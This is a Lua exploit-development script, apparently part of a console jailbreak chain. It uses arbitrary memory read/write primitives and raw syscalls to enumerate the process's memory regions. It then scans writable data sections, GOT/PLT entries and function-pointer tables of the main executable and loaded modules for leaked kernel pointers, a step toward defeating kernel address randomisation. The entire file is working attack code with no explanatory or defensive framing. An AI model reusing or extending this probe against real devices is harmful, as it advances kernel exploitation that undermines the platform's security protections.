-- CRASH_CLASS: LOW
-- PROBE 74c: Eboot + module GOT/PLT kernel pointer scan
--
-- Scans writable data sections (p=0x3) of eboot and all modules for
-- kernel pointers. Dynamic linker GOT/PLT resolution may store
-- kernel-derived addresses. Also scans for vtables and function
-- pointer tables that might reference kernel space.

print("=== PROBE 74c: EBOOT GOT/DATA KERNEL POINTER SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 then
        if h == 0xFFFFFFFF and (l == 0x00000000 or l == 0xFFFFFFFF) then
            return false
        end
        if h == 0x00000000 and l == 0xFFFFFFFF then return false end
        return true
    end
    return false
end

-- Get eboot base via 593
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot_base=" .. fmt(eb))

-- ============================================================
-- [A] ENUMERATE ALL VM REGIONS VIA 674
-- ============================================================
print("")
print("[A] Enumerating VM regions via sys 674")

local sc674 = mk(674)
local rbuf = memory.alloc(0x100)
local regions = {}
local scan_addr = uint64(0)
local max_regions = 400

for i = 1, max_regions do
    for j = 0, 0xFC, 4 do wd(N(rbuf) + j, 0) end

    local ret = nil
    pcall(function() ret = sc674(scan_addr, rbuf) end)
    if ret == nil then break end
    local rv = N(ret)
    if rv ~= 0 then break end

    local s_lo = rd(N(rbuf) + 0x00) or 0
    local s_hi = rd(N(rbuf) + 0x04) or 0
    local e_lo = rd(N(rbuf) + 0x08) or 0
    local e_hi = rd(N(rbuf) + 0x0C) or 0
    local prot = rd(N(rbuf) + 0x18) or 0

    if s_lo < 0 then s_lo = s_lo + 0x100000000 end
    if s_hi < 0 then s_hi = s_hi + 0x100000000 end
    if e_lo < 0 then e_lo = e_lo + 0x100000000 end
    if e_hi < 0 then e_hi = e_hi + 0x100000000 end

    local start_addr = uint64(string.format("0x%X%08X", s_hi, s_lo))
    local end_addr = uint64(string.format("0x%X%08X", e_hi, e_lo))

    local name_bytes = {}
    for k = 0, 31 do
        local b = rd(N(rbuf) + 0x20 + k)
        if b == nil or b == 0 then break end
        if b >= 32 and b < 127 then
            table.insert(name_bytes, string.char(b))
        end
    end
    local name = table.concat(name_bytes)

    table.insert(regions, {
        start = start_addr,
        start_lo = s_lo, start_hi = s_hi,
        end_a = end_addr,
        end_lo = e_lo, end_hi = e_hi,
        prot = prot,
        name = name,
    })

    scan_addr = end_addr
    if e_hi == 0 and e_lo == 0 then break end
end

print(string.format("  total regions: %d", #regions))

-- Find RW (p=0x3) regions
local rw_regions = {}
for _, r in ipairs(regions) do
    if r.prot == 3 then
        table.insert(rw_regions, r)
    end
end
print(string.format("  RW (p=0x3) regions: %d", #rw_regions))

-- Print first 30 RW regions
local show = math.min(#rw_regions, 30)
for i = 1, show do
    local r = rw_regions[i]
    local sz_lo = r.end_lo - r.start_lo
    local sz_hi = r.end_hi - r.start_hi
    if sz_lo < 0 then sz_lo = sz_lo + 0x100000000; sz_hi = sz_hi - 1 end
    local sz = sz_hi * 0x100000000 + sz_lo
    print(string.format("    [%2d] %s - %s  sz=0x%X  %s",
        i, fmt(r.start), fmt(r.end_a), sz, r.name))
end

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] DENSE SCAN OF ALL RW REGIONS FOR KERNEL POINTERS
-- ============================================================
print("")
print("[B] Dense scan of ALL RW regions for kernel pointers")

local total_qwords = 0
local total_kptrs = 0
local total_module_ptrs = 0
local kptr_hits = {}
local MAX_KPTR_LOG = 50

for ri, r in ipairs(rw_regions) do
    if not alive() then print("DEAD during scan"); break end

    local sz_lo = r.end_lo - r.start_lo
    local sz_hi = r.end_hi - r.start_hi
    if sz_lo < 0 then sz_lo = sz_lo + 0x100000000; sz_hi = sz_hi - 1 end
    local sz = sz_hi * 0x100000000 + sz_lo

    -- Cap per-region scan at 2MB
    if sz > 0x200000 then sz = 0x200000 end

    local region_kptrs = 0
    local region_modptrs = 0
    local region_qw = 0

    for off = 0, sz - 8, 8 do
        local val = rq(uint64(string.format("0x%X%08X", r.start_hi, r.start_lo)) + uint64(off))
        if val == nil then break end

        region_qw = region_qw + 1
        local h, l = get_hi_lo(val)

        if is_kptr(val) then
            region_kptrs = region_kptrs + 1
            if #kptr_hits < MAX_KPTR_LOG then
                table.insert(kptr_hits, {
                    region = ri,
                    name = r.name,
                    offset = off,
                    val = val,
                })
                print(string.format("  *** KPTR [%s] +0x%X = %s ***",
                    r.name, off, fmt(val)))
            end
        end

        -- Check for module-range pointers (0x0..0x10_00000000 range, > 0x1000)
        if h >= 0 and h <= 0x0F and (h > 0 or l > 0x10000) then
            region_modptrs = region_modptrs + 1
        end
    end

    total_qwords = total_qwords + region_qw
    total_kptrs = total_kptrs + region_kptrs
    total_module_ptrs = total_module_ptrs + region_modptrs

    if region_kptrs > 0 or ri <= 10 then
        print(string.format("  region[%d] %s: %d qwords, %d kptrs, %d modptrs",
            ri, r.name, region_qw, region_kptrs, region_modptrs))
    end

    -- Progress every 20 regions
    if ri % 20 == 0 then
        print(string.format("  ... scanned %d/%d regions, %d total qwords, %d kptrs",
            ri, #rw_regions, total_qwords, total_kptrs))
    end
end

print(string.format("  TOTAL: %d qwords scanned, %d kernel pointers, %d module pointers",
    total_qwords, total_kptrs, total_module_ptrs))

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] MODULE WRITABLE DATA SCAN (handles 0-38)
-- ============================================================
print("")
print("[C] Module writable data scan (handles 0-38)")

local mod_info = memory.alloc(0x200)
local mod_kptrs = 0
local mod_scanned = 0

for handle = 0, 38 do
    if not alive() then print("DEAD at module " .. handle); break end

    wd(N(mod_info), 0x160)
    local ret = nil
    pcall(function() ret = mk(593)(uint64(handle), mod_info) end)
    if ret == nil or N(ret) ~= 0 then
        -- skip invalid handle
    else
        local tlo = rd(N(mod_info) + 0x108) or 0
        local thi = rd(N(mod_info) + 0x10C) or 0
        if tlo < 0 then tlo = tlo + 0x100000000 end
        if thi < 0 then thi = thi + 0x100000000 end
        local mod_base = thi * 0x100000000 + tlo

        -- For each module, find RW regions in the 674 map that might belong to it
        -- Module data is typically within a few MB of the text base
        local mod_data_kptrs = 0
        local mod_data_qw = 0

        for _, r in ipairs(rw_regions) do
            local r_start = r.start_hi * 0x100000000 + r.start_lo
            local r_end = r.end_hi * 0x100000000 + r.end_lo
            -- Check if region is within ~32MB of module text base
            local diff = 0
            if r_start >= mod_base then
                diff = r_start - mod_base
            else
                diff = mod_base - r_start
            end

            if diff < 0x2000000 then
                local r_sz = r_end - r_start
                if r_sz > 0x200000 then r_sz = 0x200000 end

                for off = 0, r_sz - 8, 8 do
                    local addr_str = string.format("0x%X%08X", r.start_hi, r.start_lo)
                    local val = rq(uint64(addr_str) + uint64(off))
                    if val == nil then break end
                    mod_data_qw = mod_data_qw + 1

                    if is_kptr(val) then
                        mod_data_kptrs = mod_data_kptrs + 1
                        if mod_data_kptrs <= 20 then
                            print(string.format("  *** MOD[%d] KPTR at %s+0x%X = %s ***",
                                handle, fmt(r.start), off, fmt(val)))
                        end
                    end
                end
            end
        end

        if mod_data_kptrs > 0 then
            print(string.format("  module %d: %d kptrs in %d qwords",
                handle, mod_data_kptrs, mod_data_qw))
        end

        mod_kptrs = mod_kptrs + mod_data_kptrs
        mod_scanned = mod_scanned + 1
    end
end

print(string.format("  modules scanned: %d, total kptrs: %d", mod_scanned, mod_kptrs))

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] FUNCTION POINTER TABLE SCAN
-- ============================================================
print("")
print("[D] Function pointer table scan (eboot RW)")

-- Look for consecutive qwords in eboot's RW region that look like code pointers
-- (values in known module text ranges)
local eb_hi_val = ehi
local eb_lo_val = elo

local vtable_count = 0
local vtable_kptr = 0

for _, r in ipairs(rw_regions) do
    local r_start = r.start_hi * 0x100000000 + r.start_lo
    local r_end = r.end_hi * 0x100000000 + r.end_lo

    -- Check if this region is near eboot
    local diff = 0
    if r_start >= (ehi * 0x100000000 + elo) then
        diff = r_start - (ehi * 0x100000000 + elo)
    else
        diff = (ehi * 0x100000000 + elo) - r_start
    end
    if diff >= 0x2000000 then
        -- skip, not near eboot
    else
        local r_sz = r_end - r_start
        if r_sz > 0x200000 then r_sz = 0x200000 end

        local consecutive = 0
        local run_start = 0

        for off = 0, r_sz - 8, 8 do
            local val = rq(uint64(string.format("0x%X%08X", r.start_hi, r.start_lo)) + uint64(off))
            if val == nil then break end
            local h, l = get_hi_lo(val)

            -- Is this a code pointer? (in userland module range, > 0x10000)
            local is_code = (h >= 0 and h <= 0x0F and l > 0x10000)
            local is_kern = is_kptr(val)

            if is_code or is_kern then
                consecutive = consecutive + 1
                if consecutive == 1 then run_start = off end
                if is_kern then
                    vtable_kptr = vtable_kptr + 1
                    print(string.format("  *** VTABLE KPTR at +0x%X (run start +0x%X, len %d) = %s ***",
                        off, run_start, consecutive, fmt(val)))
                end
            else
                if consecutive >= 4 then
                    vtable_count = vtable_count + 1
                end
                consecutive = 0
            end
        end
    end
end

print(string.format("  function pointer tables found: %d", vtable_count))
print(string.format("  kernel pointers in tables: %d", vtable_kptr))

if not alive() then print("DEAD after section D"); return end

-- ============================================================
-- [E] SUMMARY
-- ============================================================
print("")
print("[E] SUMMARY")
print(string.format("  VM regions total: %d", #regions))
print(string.format("  RW regions scanned: %d", #rw_regions))
print(string.format("  Total qwords: %d", total_qwords))
print(string.format("  Kernel pointers (section B): %d", total_kptrs))
print(string.format("  Module data kptrs (section C): %d", mod_kptrs))
print(string.format("  Vtable kptrs (section D): %d", vtable_kptr))
print(string.format("  Module-range pointers: %d", total_module_ptrs))

if total_kptrs == 0 and mod_kptrs == 0 and vtable_kptr == 0 then
    print("")
    print("  CONCLUSION: Zero kernel pointers in all writable data sections.")
    print("  GOT/PLT entries do not contain kernel addresses.")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 74c COMPLETE ===")
